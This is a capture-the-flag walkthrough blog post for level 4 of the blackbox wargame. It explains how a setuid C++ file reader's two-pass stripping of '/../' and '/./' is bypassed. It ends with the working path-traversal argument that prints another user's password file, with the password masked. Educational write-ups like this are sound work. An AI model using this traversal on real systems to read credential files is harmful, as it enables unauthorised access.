---
layout: post
title:  "Blackbox"
subtitle: "Level 4"
date:   2012-01-22
categories: reverse-engineering
---

Welcome back to the walkthrough of the blackbox wargame.

__As in the previous posts, the password for the next level has been replaced with question marks so as to not make this too obvious, and so that the point of the walkthrough, which is mainly educational, will not be missed.__

Also, make sure you notice this SPOILER ALERT! If you want to try and solve the level by yourself then read no further!

As always, let's login and check out the turf:

```
$ ssh -p 2225 level4@blackbox.smashthestack.org
level4@blackbox.smashthestack.org's password:
...
level4@blackbox:~$ ls -l
total 1176
-rw-r--r-- 1 root   level5      10 2007-12-29 14:10 password
-rwsr-xr-x 1 level5 level5 1189214 2008-01-12 21:07 shared
-rw-r--r-- 1 root   root      1505 2007-12-29 14:10 shared.cc
```

As before, the executable has the suid bit. I think I will stop mentioning this from now on.

And we got a source file, again. Let's see:

```cpp
#include <iostream>
#include <fstream>
#include <string>


std::string strreplace(const char *msg, const char *replace, const char *with)
{
    std::string ret;

    while(*msg) {
        if(strncmp(msg, replace, strlen(replace)) == 0) {
            ret += with;

            // Skip all in msg until we have another match
            msg++;
            for(unsigned int i = 1; i < strlen(replace) && *msg; i++) {
                if(strncmp(msg, replace, strlen(replace)) == 0)
                    break;
                msg++;
            }

            continue;
        } else
                ret += *msg;
        msg++;
    }

    return ret;
}

int main(int argc, char **argv)
{
    if(argc < 2) {
        std::cout << "This program allows you to read files from my shared\
         files. See /usr/share/level5 for my shared files. Simply use the\
         path relative to my shared files to read a file!" << std::endl;
        std::cout << "Example: " << argv[0] << " lyrics/foreverautumn" <<\
         std::endl;
        return 1;
    }

    std::string start_path = "/usr/share/level5/";
    std::string relative_path = "";
    char *ptr;

    ptr = argv[1];
    while(*ptr == '/' || *ptr == '.')
        ptr++;

    relative_path = strreplace(ptr, "/../", "");
    relative_path = strreplace(relative_path.c_str(), "/./", "");

    std::string realpath = start_path + relative_path;

    std::cout << "Contents of " << realpath << ":" << std::endl;

    std::ifstream file(realpath.c_str(), std::ios::in);
    if(!file.is_open()) {
        std::cerr << "Unable to open file" << std::endl;
        return 1;
    }

    std::string cline;

    while(!file.eof()) {
        std::getline(file, cline);
        std::cout << cline << std::endl;
    }

    return 0;
}
```

Well, the program just takes the path provided in the arguments, strips all attempts to break out of the path (meaning `'/'` - to `root`, and `'.'`, or more precisely `'..'` to go up the directory tree), and then proceeds to thwart all further attempts to break out of the static path by deleting occurrences of `'/../'` and `'/./'`.

It then appends the sanitized path to the base path `/usr/share/level5/`, opens that file and prints all the lines in it.

Looks pretty safe in terms of being able to make it print the contents of level5's password file, however on closer examination, there is something that the author forgot to take into account - what if somewhere in the path, I have the substring `"/./.././"`? On first look, you'd be tempted to think it will all be deleted, but, the replacement is not done in one sweep, but in two.

first, `"/../"` will be removed, which would leave us with `"/../"`, and now we have a nice strategy for breaking away from a fixed path, because on the second `strreplace`, nothing will be deleted from the string as it is looking for another pattern.

We are still left with one problem, how to break from the fixed path in the beginning, seeing as we are not allowed backslashes or dots.

Well, we did not examine everything in this level, have we? we have that base path: `/usr/share/level5`. Let's see what it has to offer:

```
level4@blackbox:~$ ls -l /usr/share/level5
total 24
drwxr-xr-x 2 root root 4096 2008-04-21 18:17 lyrics
-rw-r--r-- 1 root root    5 2008-01-12 21:10 shit1
-rw-r--r-- 1 root root    5 2008-01-12 21:10 shit2
-rw-r--r-- 1 root root    5 2008-01-12 21:10 shit3
-rw-r--r-- 1 root root    5 2008-01-12 21:10 shit4
-rw-r--r-- 1 root root    5 2008-01-12 21:10 shit5
```

Excellent! we have a directory in there which can be used to get the path started, and then using the technique we found earlier we can get to any path we want, specifically `/home/level5/password`:

```
level4@blackbox:~$ ./shared lyrics/./../././../././../././.././home/level5/password
Contents of /usr/share/level5/lyrics/../../../../home/level5/password:
???
```

Looks like we are done :)
